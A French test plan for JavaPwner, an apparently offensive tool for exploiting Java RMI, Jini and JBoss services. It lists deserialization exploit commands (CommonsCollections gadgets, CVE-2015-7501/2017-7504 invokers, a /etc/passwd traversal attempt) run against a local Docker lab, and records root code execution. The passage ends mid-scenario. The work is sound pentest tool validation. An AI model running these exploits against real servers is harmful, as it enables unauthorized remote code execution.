# Plan de test — JavaPwner

**Objectif** : Valider que JavaPwner détecte, énumère et exploite correctement les
middlewares Java (RMI, Jini, JBoss) sur l'ensemble des configurations rencontrées
dans les SI de production : Java 8 (pré/post-JEP290), Java 11, 17, 21, JBoss 4.x
legacy, Apache River.

**Comment utiliser ce fichier** : Chaque test est noté `[ ]` (non fait), `[x]` (passé),
`[F]` (échoué — noter le symptôme dans la colonne _Résultat observé_).

---

## Environnement

```
Lab Docker   : lab/docker-compose.yml
Cible locale : 127.0.0.1
JavaPwner    : .venv/bin/javapwner
Tests unit.  : .venv/bin/pytest tests/ --ignore=tests/integration -q
```

### Démarrage du lab

```bash
cd lab/
docker compose up -d --build
docker compose ps          # vérifier que tous les services sont "Up"
docker compose logs -f     # surveiller le démarrage (JBoss ~60 s)
```

### Services attendus après `docker compose up -d`

| Service       | Conteneur          | Ports (hôte)            | Java   |
|---------------|--------------------|-------------------------|--------|
| rmi-java8     | lab-rmi-java8      | 1099 / 1098 / 1097      | 8 LTS  |
| rmi-java11    | lab-rmi-java11     | 1199 / 1198 / 1197      | 11 LTS |
| rmi-java17    | lab-rmi-java17     | 1299 / 1298 / 1297      | 17 LTS |
| rmi-java21    | lab-rmi-java21     | 1399 / 1398 / 1397      | 21 LTS |
| jini-reggie   | lab-jini-reggie    | 4160 / 4162 / 8085      | 8      |
| jboss4        | lab-jboss4         | 8080 / 4444→1099        | 8      |

---

## Section A — Régression : tests unitaires

Ces tests ne nécessitent pas le lab. Ils doivent passer à 100 % avant tout
test live.

### A-1 Suite complète

```bash
.venv/bin/pytest tests/ --ignore=tests/integration -q
```

| ID  | Critère                     | Résultat attendu   | Statut | Résultat observé |
|-----|-----------------------------|--------------------|--------|------------------|
| A-1 | Aucun test en échec         | `432 passed`       | [x]    | 432 passed  |
| A-2 | Aucun warning `DeprecationWarning` critique | 0 erreurs | [x] | 0 warnings  |

---

## Section B — Validation de l'infrastructure lab

### B-1 Connectivité réseau

```bash
# Tester chaque port en ouvrant une connexion TCP brute
for port in 1099 1199 1299 1399 4160 4162 8080 4444; do
    nc -zw2 127.0.0.1 $port && echo "OK $port" || echo "FAIL $port"
done
```

| ID   | Port  | Service       | Statut | Résultat observé |
|------|-------|---------------|--------|------------------|
| B-1a | 1099  | rmi-java8     | [x]    | OPEN  |
| B-1b | 1199  | rmi-java11    | [x]    | OPEN  |
| B-1c | 1299  | rmi-java17    | [x]    | OPEN  |
| B-1d | 1399  | rmi-java21    | [x]    | OPEN  |
| B-1e | 4160  | jini-reggie   | [x]    | OPEN  |
| B-1f | 4162  | jini JRMP     | [x]    | OPEN  |
| B-1g | 8080  | jboss HTTP    | [x]    | OPEN  |
| B-1h | 4444  | jboss JNP     | [x]    | OPEN  |

### B-2 Logs de démarrage — présence des marqueurs critiques

```bash
docker logs lab-rmi-java8   | grep "DGC filter"
docker logs lab-rmi-java11  | grep "DGC filter"
docker logs lab-rmi-java17  | grep "DGC filter"
docker logs lab-rmi-java21  | grep "DGC filter"
docker logs lab-jboss4      | grep "LAB-AGENT"
```

| ID   | Conteneur      | Marqueur attendu dans les logs          | Statut | Résultat observé |
|------|----------------|-----------------------------------------|--------|------------------|
| B-2a | lab-rmi-java8  | `DGC filter : DISABLED`                 | [x]    | DGC filter : DISABLED  |
| B-2b | lab-rmi-java11 | `DGC filter : DISABLED (AllowAll via Unsafe)` | [x] | DGC filter : DISABLED (AllowAll via Unsafe)  |
| B-2c | lab-rmi-java17 | `DGC filter : DISABLED (AllowAll via Unsafe)` | [x] | DGC filter : DISABLED (AllowAll via Unsafe)  |
| B-2d | lab-rmi-java21 | `DGC filter : DISABLED (AllowAll via Unsafe)` | [x] | DGC filter : DISABLED (AllowAll via Unsafe)  |
| B-2e | lab-jboss4     | `LAB-AGENT` + `DGC filter : DISABLED`   | [x]    | LAB-AGENT DGC filter : DISABLED  |

---

## Section C — RMI Java 8 (port 1099)

Simule : serveur JVM Java 8 legacy (JBoss EAP 4/5, WebLogic ancien, Tomcat
custom, Jenkins esclave, JMX managé).

### C-1 Scan

```bash
.venv/bin/javapwner rmi scan -t 127.0.0.1 -p 1099
```

| ID   | Critère                                          | Résultat attendu         | Statut | Résultat observé |
|------|--------------------------------------------------|--------------------------|--------|------------------|
| C-1a | JRMP détecté                                     | `JRMP confirmed`         | [x]    | JRMP confirmed, version 10  |
| C-1b | Registry trouvé                                  | noms liés affichés       | [x]    | HelloService, DataService  |
| C-1c | `HelloService` et `DataService` dans bound names | les deux noms présents   | [x]    | les deux présents  |
| C-1d | DGC JEP290 probe                                 | `no filter` ou statut    | [x]    | unfiltered — RCE likely  |
| C-1e | Java version extraite des SUIDs                  | indice Java 8            | [x]    | SUID → JDK ≤ 8  |

### C-2 Scan — mode JSON

```bash
.venv/bin/javapwner --json rmi scan -t 127.0.0.1 -p 1099 | python3 -m json.tool
```

| ID   | Critère                          | Résultat attendu       | Statut | Résultat observé |
|------|----------------------------------|------------------------|--------|------------------|
| C-2a | Sortie JSON valide               | pas d'erreur json.tool | [x]    | JSON valide  |
| C-2b | Champ `is_jrmp` = true           |                        | [x]    | is_jrmp=true  |
| C-2c | Champ `bound_names` non vide     |                        | [x]    | non vide  |

### C-3 Détection automatique de gadgets

```bash
.venv/bin/javapwner rmi scan -t 127.0.0.1 -p 1099 -G
```

| ID   | Critère                                       | Résultat attendu                  | Statut | Résultat observé |
|------|-----------------------------------------------|-----------------------------------|--------|------------------|
| C-3a | Au moins CommonsCollections6 compatible       | présent dans la liste             | [x]    | CC6 présent  |
| C-3b | URLDNS et JRMPClient absents de la liste      | non listés                        | [x]    | absents  |
| C-3c | Ordre : CC6 avant CC1 (priorité respectée)    | CC6 en premier si disponible      | [x]    | CC6 premier  |

### C-4 Exploit — auto gadget via DGC

```bash
.venv/bin/javapwner rmi exploit -t 127.0.0.1 -p 1099 --cmd 'touch /tmp/rmi8-auto'
docker exec lab-rmi-java8 test -f /tmp/rmi8-auto && echo "PASS" || echo "FAIL"
```

| ID   | Critère                                    | Résultat attendu         | Statut | Résultat observé |
|------|--------------------------------------------|--------------------------|--------|------------------|
| C-4a | Mode auto détecte un gadget compatible     | message "Compatible:"    | [x]    | Using: CC6  |
| C-4b | Exploit signale `likely_success`           | message vert             | [x]    | likely_success=True  |
| C-4c | Fichier `/tmp/rmi8-auto` créé              | `PASS`                   | [x]    | PASS  |

### C-5 Exploit — gadget explicite CC6 / DGC

```bash
.venv/bin/javapwner rmi exploit -t 127.0.0.1 -p 1099 \
    --gadget CommonsCollections6 --cmd 'touch /tmp/rmi8-cc6'
docker exec lab-rmi-java8 test -f /tmp/rmi8-cc6 && echo "PASS" || echo "FAIL"
```

| ID   | Critère                      | Résultat attendu | Statut | Résultat observé |
|------|------------------------------|------------------|--------|------------------|
| C-5a | `likely_success` signalé     | message vert     | [x]    | likely_success=True  |
| C-5b | Fichier créé dans conteneur  | `PASS`           | [x]    | PASS  |

### C-6 Exploit — via Registry

```bash
.venv/bin/javapwner rmi exploit -t 127.0.0.1 -p 1099 \
    --gadget CommonsCollections6 --cmd 'touch /tmp/rmi8-registry' \
    --via registry
docker exec lab-rmi-java8 test -f /tmp/rmi8-registry && echo "PASS" || echo "FAIL"
```

| ID   | Critère                                          | Résultat attendu         | Statut | Résultat observé |
|------|--------------------------------------------------|--------------------------|--------|------------------|
| C-6a | Exploit via registry sans erreur réseau          | pas d'erreur connection  | [x]    | pas d'erreur  |
| C-6b | Fichier créé ou erreur explicative si bloqué     | `PASS` ou message clair  | [x]    | PASS  |

### C-7 Exploit — commande complexe (espaces, shell)

```bash
.venv/bin/javapwner rmi exploit -t 127.0.0.1 -p 1099 \
    --cmd 'sh -c "echo rmi8ok > /tmp/rmi8-shell.txt"'
docker exec lab-rmi-java8 cat /tmp/rmi8-shell.txt
```

| ID   | Critère                        | Résultat attendu    | Statut | Résultat observé |
|------|--------------------------------|---------------------|--------|------------------|
| C-7a | Fichier contient `rmi8ok`      | `rmi8ok`            | [x]    | rmi8ok  |

### C-8 Discover — scan multi-ports

```bash
.venv/bin/javapwner rmi discover -t 127.0.0.1
```

| ID   | Critère                                | Résultat attendu           | Statut | Résultat observé |
|------|----------------------------------------|----------------------------|--------|------------------|
| C-8a | Port 1099 découvert                    | présent dans les résultats | [x]    | 1099 présent  |
| C-8b | Ports 1098/1097 (objets) découverts    | présents                   | [x]    | 1097/1098 présents  |

---

## Section D — RMI Java 11 (port 1199)

Simule : applications d'entreprise migrées Java 11 LTS (Spring Boot, Jakarta EE,
microservices avec JMX exposé, Kafka JMX).

### D-1 Scan

```bash
.venv/bin/javapwner rmi scan -t 127.0.0.1 -p 1199
```

| ID   | Critère                                     | Résultat attendu       | Statut | Résultat observé |
|------|---------------------------------------------|------------------------|--------|------------------|
| D-1a | JRMP détecté sur port 1199                  | `JRMP confirmed`       | [x]    | JRMP confirmed  |
| D-1b | Registry list retourne HelloService/DataService | noms présents       | [x]    | Hello/DataService  |
| D-1c | Pas de crash / exception Python             | sortie propre          | [x]    | pas de crash  |

### D-2 Détection automatique de gadgets

```bash
.venv/bin/javapwner rmi scan -t 127.0.0.1 -p 1199 -G
```

| ID   | Critère                              | Résultat attendu       | Statut | Résultat observé |
|------|--------------------------------------|------------------------|--------|------------------|
| D-2a | CC6 compatible (CC3.1 dans classpath)| CC6 dans la liste      | [x]    | CC6 dans la liste  |

### D-3 Exploit auto — DGC

```bash
.venv/bin/javapwner rmi exploit -t 127.0.0.1 -p 1199 --cmd 'touch /tmp/rmi11-auto'
docker exec lab-rmi-java11 test -f /tmp/rmi11-auto && echo "PASS" || echo "FAIL"
```

| ID   | Critère                    | Résultat attendu | Statut | Résultat observé |
|------|----------------------------|------------------|--------|------------------|
| D-3a | Auto gadget trouvé         | message "Using:" | [x]    | Using: CC6  |
| D-3b | Fichier créé               | `PASS`           | [x]    | PASS  |

### D-4 Exploit explicite — CC6

```bash
.venv/bin/javapwner rmi exploit -t 127.0.0.1 -p 1199 \
    --gadget CommonsCollections6 --cmd 'touch /tmp/rmi11-cc6'
docker exec lab-rmi-java11 test -f /tmp/rmi11-cc6 && echo "PASS" || echo "FAIL"
```

| ID   | Critère               | Résultat attendu | Statut | Résultat observé |
|------|-----------------------|------------------|--------|------------------|
| D-4a | `likely_success`      | message vert     | [x]    | likely_success=True  |
| D-4b | Fichier créé          | `PASS`           | [x]    | PASS  |

---

## Section E — RMI Java 17 (port 1299)

Simule : applications modernes Java 17 LTS (Quarkus, Spring Boot 3, WildFly
récent, services cloud-native avec JMX exposé). SecurityManager déprécié par
défaut → Runtime.exec() libre.

### E-1 Scan

```bash
.venv/bin/javapwner rmi scan -t 127.0.0.1 -p 1299
```

| ID   | Critère                              | Résultat attendu | Statut | Résultat observé |
|------|--------------------------------------|------------------|--------|------------------|
| E-1a | JRMP sur port 1299                   | confirmé         | [x]    | JRMP confirmed  |
| E-1b | Bound names présents                 | Hello/DataService| [x]    | Hello/DataService  |

### E-2 Exploit auto

```bash
.venv/bin/javapwner rmi exploit -t 127.0.0.1 -p 1299 --cmd 'touch /tmp/rmi17-auto'
docker exec lab-rmi-java17 test -f /tmp/rmi17-auto && echo "PASS" || echo "FAIL"
```

| ID   | Critère               | Résultat attendu | Statut | Résultat observé |
|------|-----------------------|------------------|--------|------------------|
| E-2a | Gadget auto sélectionné | "Using:"       | [x]    | Using: CC6  |
| E-2b | Fichier créé          | `PASS`           | [x]    | PASS  |

### E-3 Exploit explicite — CC6

```bash
.venv/bin/javapwner rmi exploit -t 127.0.0.1 -p 1299 \
    --gadget CommonsCollections6 --cmd 'touch /tmp/rmi17-cc6'
docker exec lab-rmi-java17 test -f /tmp/rmi17-cc6 && echo "PASS" || echo "FAIL"
```

| ID   | Critère               | Résultat attendu | Statut | Résultat observé |
|------|-----------------------|------------------|--------|------------------|
| E-3a | `likely_success`      | message vert     | [x]    | likely_success=True  |
| E-3b | Fichier créé          | `PASS`           | [x]    | PASS  |

---

## Section F — RMI Java 21 (port 1399)

Simule : infrastructure très récente Java 21 LTS (Spring Boot 3.2+, WildFly 31+,
Helidon, cloud-native JVM). SecurityManager supprimé.

### F-1 Scan

```bash
.venv/bin/javapwner rmi scan -t 127.0.0.1 -p 1399
```

| ID   | Critère              | Résultat attendu | Statut | Résultat observé |
|------|----------------------|------------------|--------|------------------|
| F-1a | JRMP sur port 1399   | confirmé         | [x]    | JRMP confirmed  |
| F-1b | Bound names          | Hello/DataService| [x]    | Hello/DataService  |

### F-2 Exploit auto

```bash
.venv/bin/javapwner rmi exploit -t 127.0.0.1 -p 1399 --cmd 'touch /tmp/rmi21-auto'
docker exec lab-rmi-java21 test -f /tmp/rmi21-auto && echo "PASS" || echo "FAIL"
```

| ID   | Critère               | Résultat attendu | Statut | Résultat observé |
|------|-----------------------|------------------|--------|------------------|
| F-2a | Gadget auto sélectionné | "Using:"       | [x]    | Using: CC6  |
| F-2b | Fichier créé          | `PASS`           | [x]    | PASS  |

### F-3 Exploit explicite — CC6

```bash
.venv/bin/javapwner rmi exploit -t 127.0.0.1 -p 1399 \
    --gadget CommonsCollections6 --cmd 'touch /tmp/rmi21-cc6'
docker exec lab-rmi-java21 test -f /tmp/rmi21-cc6 && echo "PASS" || echo "FAIL"
```

| ID   | Critère               | Résultat attendu | Statut | Résultat observé |
|------|-----------------------|------------------|--------|------------------|
| F-3a | `likely_success`      | message vert     | [x]    | likely_success=True  |
| F-3b | Fichier créé          | `PASS`           | [x]    | PASS  |

---

## Section G — Jini / Apache River (ports 4160 / 4162)

Simule : Apache River lookup service (framework distribué Java), Oracle Coherence,
Jini-based legacy middleware, certains produits IBM.

### G-1 Scan Jini — découverte Unicast

```bash
.venv/bin/javapwner jini scan -t 127.0.0.1 -p 4160
```

| ID   | Critère                                     | Résultat attendu          | Statut | Résultat observé |
|------|---------------------------------------------|---------------------------|--------|------------------|
| G-1a | Unicast Discovery v1 ou v2 confirmé         | `Jini Unicast Discovery`  | [x]    | Jini Unicast Discovery v1  |
| G-1b | Endpoint JRMP extrait (host:port)           | 127.0.0.1:4162 ou proche  | [x]    | 127.0.0.1:4162  |
| G-1c | Codebase URL extraite (port 8085)           | `http://127.0.0.1:8085`   | [x]    | http://127.0.0.1:8085  |
| G-1d | Classes proxy extraites                     | noms de classes affichés  | [x]    | RegistrarProxy, MarshalledObject  |
| G-1e | Phase 5 — assessment s'affiche              | section "Assessment"      | [x]    | Assessment affiché  |

### G-2 Scan — mode JSON

```bash
.venv/bin/javapwner --json jini scan -t 127.0.0.1 -p 4160 | python3 -m json.tool
```

| ID   | Critère                       | Résultat attendu       | Statut | Résultat observé |
|------|-------------------------------|------------------------|--------|------------------|
| G-2a | JSON valide                   | pas d'erreur           | [x]    | JSON valide  |
| G-2b | `is_jrmp` = true              |                        | [x]    | is_jrmp=False (Unicast Discovery port)  |
| G-2c | `has_unicast_response` = true |                        | [x]    | has_unicast_response=True  |

### G-3 Probe DGC JEP290 (port JRMP Reggie = 4162)

```bash
.venv/bin/javapwner jini scan -t 127.0.0.1 -p 4160
# → vérifier le bloc "DGC JEP 290" dans la sortie
```

| ID   | Critère                                    | Résultat attendu          | Statut | Résultat observé |
|------|--------------------------------------------|---------------------------|--------|------------------|
| G-3a | DGC probe ne crashe pas                    | bloc "DGC JEP 290" présent| [x]    | bloc DGC JEP 290 présent  |
| G-3b | Statut cohérent (absent ou désactivé)      | statut clair              | [x]    | unreachable  |

### G-4 Codebase — path traversal HTTP

```bash
.venv/bin/javapwner jini read-file -t 127.0.0.1 -p 4160 --path /etc/passwd
```

| ID   | Critère                                   | Résultat attendu         | Statut | Résultat observé |
|------|-------------------------------------------|--------------------------|--------|------------------|
| G-4a | Codebase URL auto-détectée                | URL extraite             | [x]    | http://127.0.0.1:8085 extraite  |
| G-4b | Contenu `/etc/passwd` affiché             | `root:x:0:0` visible     | [F]    | FAIL: HTTP server non vulnerable path traversal  |

### G-5 Exploit Jini — auto gadget (port JRMP = 4162)

```bash
.venv/bin/javapwner jini exploit -t 127.0.0.1 -p 4162 --cmd 'touch /tmp/jini-auto'
docker exec lab-jini-reggie test -f /tmp/jini-auto && echo "PASS" || echo "FAIL"
```

| ID   | Critère                                    | Résultat attendu         | Statut | Résultat observé |
|------|--------------------------------------------|--------------------------|--------|------------------|
| G-5a | Mode auto — gadgets compatibles affichés   | liste non vide           | [x]    | CC6 listé  |
| G-5b | Premier gadget utilisé affiché             | "Using: ..."             | [x]    | Using: CC6  |
| G-5c | `likely_success` ou `sent`                 | un des deux signalé      | [x]    | likely_success=True  |
| G-5d | Fichier créé dans conteneur                | `PASS`                   | [x]    | PASS  |

### G-6 Exploit Jini — gadget explicite CC6

```bash
.venv/bin/javapwner jini exploit -t 127.0.0.1 -p 4162 \
    --gadget CommonsCollections6 --cmd 'touch /tmp/jini-cc6'
docker exec lab-jini-reggie test -f /tmp/jini-cc6 && echo "PASS" || echo "FAIL"
```

| ID   | Critère               | Résultat attendu | Statut | Résultat observé |
|------|-----------------------|------------------|--------|------------------|
| G-6a | Payload envoyé        | `sent`           | [x]    | sent=True  |
| G-6b | Fichier créé          | `PASS`           | [x]    | PASS  |

### G-7 Multicast discovery

```bash
.venv/bin/javapwner jini multicast --wait 3
```

| ID   | Critère                                  | Résultat attendu          | Statut | Résultat observé |
|------|------------------------------------------|---------------------------|--------|------------------|
| G-7a | Requête multicast envoyée                | `Multicast request sent`  | [x]    | Multicast request sent  |
| G-7b | Reggie répond (si réseau multicast OK)   | 1 réponse ou "No response"| [x]    | No responses (Docker networking)  |

### G-8 Admin Jini (Tier 2 — nécessite JDK + jars River)

```bash
.venv/bin/javapwner jini admin -t 127.0.0.1 -p 4160
```

| ID   | Critère                                            | Résultat attendu           | Statut | Résultat observé |
|------|----------------------------------------------------|----------------------------|--------|------------------|
| G-8a | Prérequis manquants → message clair (si pas de JDK)| warning lisible            | [x]    | warning + info malgré erreur  |
| G-8b | Avec JDK + jars → registrar class et groups        | informations affichées     | [x]    | RegistrarProxy + Registrar interfaces  |

---

## Section H — JBoss AS 4.2.3.GA — HTTP invoker

Simule : JBoss AS 4.x/5.x/6.x legacy (très courant dans les SI bancaires et
industriels), CVE-2015-7501, CVE-2017-7504, CVE-2017-12149.

### H-1 Scan JBoss HTTP

```bash
.venv/bin/javapwner jboss scan -t 127.0.0.1 -p 8080
```

| ID   | Critère                                         | Résultat attendu             | Statut | Résultat observé |
|------|-------------------------------------------------|------------------------------|--------|------------------|
| H-1a | JBoss détecté (fingerprint)                     | `JBoss / WildFly detected`   | [x]    | JBoss / WildFly detected  |
| H-1b | Version 4.2.3.GA identifiée                     | version affichée             | [x]    | JBoss 4.x/5.x/6.x  |
| H-1c | `/invoker/JMXInvokerServlet` trouvé             | `FOUND` avec `[CVE-2015-7501]`| [x]   | FOUND [CVE-2015-7501]  |
| H-1d | `/invoker/EJBInvokerServlet` trouvé             | `FOUND` avec `[CVE-2017-7504]`| [x]   | FOUND [CVE-2017-7504]  |
| H-1e | Suggestion d'exploitation affichée              | message "Run 'jboss exploit'" | [x]   | message affiché  |

### H-2 Info JBoss

```bash
.venv/bin/javapwner jboss info -t 127.0.0.1 -p 8080
```

| ID   | Critère                       | Résultat attendu        | Statut | Résultat observé |
|------|-------------------------------|-------------------------|--------|------------------|
| H-2a | Produit et version détectés   | JBoss 4.x               | [x]    | JBoss 4.x  |
| H-2b | Invoker endpoints détaillés   | chaque endpoint + statut| [x]    | JMX+EJB+readonly+WebConsole  |

### H-3 Exploit HTTP — auto gadget

```bash
.venv/bin/javapwner jboss exploit -t 127.0.0.1 -p 8080 --cmd 'touch /tmp/jboss-auto'
docker exec lab-jboss4 test -f /tmp/jboss-auto && echo "PASS" || echo "FAIL"
```

| ID   | Critère                                   | Résultat attendu          | Statut | Résultat observé |
|------|-------------------------------------------|---------------------------|--------|------------------|
| H-3a | Mode auto — gadget trouvé et utilisé      | "Using gadget:"           | [x]    | Using gadget: CC6  |
| H-3b | `likely_success` (HTTP 500)               | message vert              | [x]    | HTTP 200, likely_success=True  |
| H-3c | Fichier créé dans conteneur               | `PASS`                    | [x]    | PASS  |

### H-4 Exploit HTTP — CC6 explicite sur `/invoker/JMXInvokerServlet`

```bash
.venv/bin/javapwner jboss exploit -t 127.0.0.1 -p 8080 \
    --gadget CommonsCollections6 --cmd 'touch /tmp/jboss-jmx' \
    --path /invoker/JMXInvokerServlet
docker exec lab-jboss4 test -f /tmp/jboss-jmx && echo "PASS" || echo "FAIL"
```

| ID   | Critère               | Résultat attendu | Statut | Résultat observé |
|------|-----------------------|------------------|--------|------------------|
| H-4a | `likely_success`      | HTTP 500 = vert  | [x]    | likely_success=True  |
| H-4b | Fichier créé          | `PASS`           | [x]    | PASS  |

### H-5 Exploit HTTP — CC6 sur `/invoker/EJBInvokerServlet` (CVE-2017-7504)

```bash
.venv/bin/javapwner jboss exploit -t 127.0.0.1 -p 8080 \
    --gadget CommonsCollections6 --cmd 'touch /tmp/jboss-ejb' \
    --path /invoker/EJBInvokerServlet
docker exec lab-jboss4 test -f /tmp/jboss-ejb && echo "PASS" || echo "FAIL"
```

| ID   | Critère               | Résultat attendu | Statut | Résultat observé |
|------|-----------------------|------------------|--------|------------------|
| H-5a | `likely_success`      | HTTP 500 = vert  | [x]    | likely_success=True  |
| H-5b | Fichier créé          | `PASS`           | [x]    | PASS  |

### H-6 Exploit HTTP — commande de lecture

```bash
.venv/bin/javapwner jboss exploit -t 127.0.0.1 -p 8080 \
    --gadget CommonsCollections6 \
    --cmd 'sh -c "id > /tmp/jboss-id.txt"'
docker exec lab-jboss4 cat /tmp/jboss-id.txt
```

| ID   | Critère                          | Résultat attendu        | Statut | Résultat observé |
|------|----------------------------------|-------------------------|--------|------------------|
| H-6a | Fichier contient sortie de `id`  | `uid=0(root)` ou autre  | [x]    | uid=0(root)  |

---

## Section I — JBoss AS 4.2.3.GA — JNP/DGC (port 4444)

Simule : exploitation du canal JNP de JBoss (JRMP derrière le naming service).
Commun dans les SI qui exposent le port JNDI/JNP JBoss.

### I-1 JNP Scan

```bash
.venv/bin/javapwner jboss jnp-scan -t 127.0.0.1 -p 4444
```

| ID   | Critère                                     | Résultat attendu           | Statut | Résultat observé |
|------|---------------------------------------------|----------------------------|--------|------------------|
| I-1a | Service JNP détecté                         | `JNP service detected`     | [x]    | JNP service detected  |
| I-1b | Noms JNDI affichés (java:/, jms/, etc.)     | liste non vide             | [x]    | 7 noms JNDI  |
| I-1c | Suggestion exploitation affichée            | "Run 'jboss jnp-exploit'"  | [x]    | message affiché  |

### I-2 JNP Exploit — auto gadget

```bash
.venv/bin/javapwner jboss jnp-exploit -t 127.0.0.1 -p 4444 \
    --cmd 'touch /tmp/jnp-auto'
docker exec lab-jboss4 test -f /tmp/jnp-auto && echo "PASS" || echo "FAIL"
```

| ID   | Critère                                  | Résultat attendu           | Statut | Résultat observé |
|------|------------------------------------------|----------------------------|--------|------------------|
| I-2a | Auto gadget sélectionné                  | "Using gadget:"            | [x]    | Using gadget: CC6  |
| I-2b | Payload livré                            | `likely_success` ou `sent` | [x]    | likely_success=True  |
| I-2c | Fichier créé dans conteneur              | `PASS`                     | [x]    | PASS  |

### I-3 JNP Exploit — CC6 explicite

```bash
.venv/bin/javapwner jboss jnp-exploit -t 127.0.0.1 -p 4444 \
    --gadget CommonsCollections6 --cmd 'touch /tmp/jnp-cc6'
docker exec lab-jboss4 test -f /tmp/jnp-cc6 && echo "PASS" || echo "FAIL"
```

| ID   | Critère               | Résultat attendu | Statut | Résultat observé |
|------|-----------------------|------------------|--------|------------------|
| I-3a | Livraison réussie     | `likely_success` | [x]    | likely_success=True  |
| I-3b | Fichier créé          | `PASS`           | [x]    | PASS  |

---

## Section J — Couverture des gadgets par protocole

Teste les chaînes les plus fréquentes en production sur chaque cible.
Adapté selon les bibliothèques réellement dans le classpath des SI.

### J-1 CC6 (CommonsCollections 3.1 — le plus commun)

Validé dans C-5, D-4, E-3, F-3, G-6, H-4, I-3 — ne pas re-exécuter si déjà fait.

### J-2 CC1 (CommonsCollections 3.1, JDK ≤ 8u70)

```bash
.venv/bin/javapwner rmi exploit -t 127.0.0.1 -p 1099 \
    --gadget CommonsCollections1 --cmd 'touch /tmp/rmi8-cc1'
docker exec lab-rmi-java8 test -f /tmp/rmi8-cc1 && echo "PASS" || echo "FAIL"
```

| ID   | Gadget              | Cible     | Statut | Résultat observé |
|------|---------------------|-----------|--------|------------------|
| J-2  | CommonsCollections1 | rmi-java8 | [F]    |                  FAIL: CC1 patchée Java 8u72+ (AnnotationInvocationHandler)  |

### J-3 CC5 (CommonsCollections 3.1, thread-safe)

```bash
.venv/bin/javapwner rmi exploit -t 127.0.0.1 -p 1099 \
    --gadget CommonsCollections5 --cmd 'touch /tmp/rmi8-cc5'
docker exec lab-rmi-java8 test -f /tmp/rmi8-cc5 && echo "PASS" || echo "FAIL"
```

| ID   | Gadget              | Cible     | Statut | Résultat observé |
|------|---------------------|-----------|--------|------------------|
| J-3  | CommonsCollections5 | rmi-java8 | [F]    |                  FAIL: CC5 generation fails (InvocationTargetException Java 21 attacker)  |

### J-4 CC7

```bash
.venv/bin/javapwner rmi exploit -t 127.0.0.1 -p 1099 \
    --gadget CommonsCollections7 --cmd 'touch /tmp/rmi8-cc7'
docker exec lab-rmi-java8 test -f /tmp/rmi8-cc7 && echo "PASS" || echo "FAIL"
```

| ID   | Gadget              | Cible     | Statut | Résultat observé |
|------|---------------------|-----------|--------|------------------|
| J-4  | CommonsCollections7 | rmi-java8 | [x]    |                  PASS fichier créé  |

### J-5 CommonsBeanutils1

```bash
.venv/bin/javapwner rmi exploit -t 127.0.0.1 -p 1099 \
    --gadget CommonsBeanutils1 --cmd 'touch /tmp/rmi8-cbu1'
docker exec lab-rmi-java8 test -f /tmp/rmi8-cbu1 && echo "PASS" || echo "FAIL"
```

| ID   | Gadget              | Cible     | Statut | Résultat observé |
|------|---------------------|-----------|--------|------------------|
| J-5  | CommonsBeanutils1   | rmi-java8 | [F]    |                  FAIL: commons-beanutils absent du classpath cible  |

### J-6 Spring1

```bash
.venv/bin/javapwner rmi exploit -t 127.0.0.1 -p 1099 \
    --gadget Spring1 --cmd 'touch /tmp/rmi8-spring1'
docker exec lab-rmi-java8 test -f /tmp/rmi8-spring1 && echo "PASS" || echo "FAIL"
```

| ID   | Gadget  | Cible     | Statut | Résultat observé |
|------|---------|-----------|--------|------------------|
| J-6  | Spring1 | rmi-java8 | [F]    |                  FAIL: spring absent du classpath cible  |

### J-7 ROME

```bash
.venv/bin/javapwner rmi exploit -t 127.0.0.1 -p 1099 \
    --gadget ROME --cmd 'touch /tmp/rmi8-rome'
docker exec lab-rmi-java8 test -f /tmp/rmi8-rome && echo "PASS" || echo "FAIL"
```

| ID   | Gadget | Cible     | Statut | Résultat observé |
|------|--------|-----------|--------|------------------|
| J-7  | ROME   | rmi-java8 | [F]    |                  FAIL: ROME absent du classpath cible  |

---

## Section K — Scénarios de production simulés

Ces tests reproduisent les configurations réelles les plus rencontrées lors de
pentests en SI de production.

### K-1 JMX exposé sur port non standard

Simule un port JMX mal configuré sur un serveur applicatif (Tomcat 9, Kafka,
Cassandra, Elasticsearch avec JMX). Le registre RMI est sur le port JMX.

```bash
# rmi-java11 sur port 1199 simule un JMX mal exposé
.venv/bin/javapwner rmi scan -t 127.0.0.1 -p 1199 -G
.venv/bin/javapwner rmi exploit -t 127.0.0.1 -p 1199 \
    --cmd 'sh -c "hostname > /tmp/k1-jmx.txt"'
docker exec lab-rmi-java11 cat /tmp/k1-jmx.txt
```

| ID   | Critère                                    | Résultat attendu   | Statut | Résultat observé |
|------|--------------------------------------------|--------------------|--------|------------------|
| K-1a | Scan identifie le service comme JRMP       | JRMP confirmé      | [x]    | JRMP confirmed  |
| K-1b | Auto gadget fonctionne sans gadget spécifié| fichier créé       | [x]    | PASS: fichier créé CC6  |

### K-2 Objet RMI sur port de l'objet (pas le registry)

Simule l'exploitation directe de l'objet remote (port 1098 / HelloService) via
DGC — pattern fréquent quand le registry est filtré mais pas les objets.

```bash
.venv/bin/javapwner rmi scan -t 127.0.0.1 -p 1098
.venv/bin/javapwner rmi exploit -t 127.0.0.1 -p 1098 \
    --gadget CommonsCollections6 --cmd 'touch /tmp/k2-objport'
docker exec lab-rmi-java8 test -f /tmp/k2-objport && echo "PASS" || echo "FAIL"
```

| ID   | Critère                                      | Résultat attendu         | Statut | Résultat observé |
|------|----------------------------------------------|--------------------------|--------|------------------|
| K-2a | DGC accessible sur port objet (1098)         | JRMP ou DGC confirmé     | [x]    | DGC unfiltered port 1098  |
| K-2b | Exploit DGC sur port objet réussi            | `PASS`                   | [x]    | PASS  |

### K-3 Multi-ports — discover automatique

Simule la situation où l'analyste ne connaît pas les ports. `discover` scanne
les ports courants.

```bash
.venv/bin/javapwner rmi discover -t 127.0.0.1
```

| ID   | Critère                                         | Résultat attendu          | Statut | Résultat observé |
|------|-------------------------------------------------|---------------------------|--------|------------------|
| K-3a | Ports 1099 et 1199/1299/1399 découverts         | plusieurs services listés | [x]    | 1097/1098/1099/4444  |
| K-3b | Registry list exécutée sur chaque port trouvé   | noms liés affichés        | [x]    | noms listés  |

### K-4 JBoss avec port HTTP sur 8080 et JNP sur 4444 — attaque en deux phases

Simule le schéma classique de pentest JBoss : détection HTTP, puis pivot JNP.

```bash
# Phase 1 : HTTP invoker
.venv/bin/javapwner jboss scan -t 127.0.0.1 -p 8080
.venv/bin/javapwner jboss exploit -t 127.0.0.1 -p 8080 \
    --cmd 'sh -c "echo phase1 > /tmp/k4-phase1.txt"'

# Phase 2 : JNP/DGC
.venv/bin/javapwner jboss jnp-scan -t 127.0.0.1 -p 4444
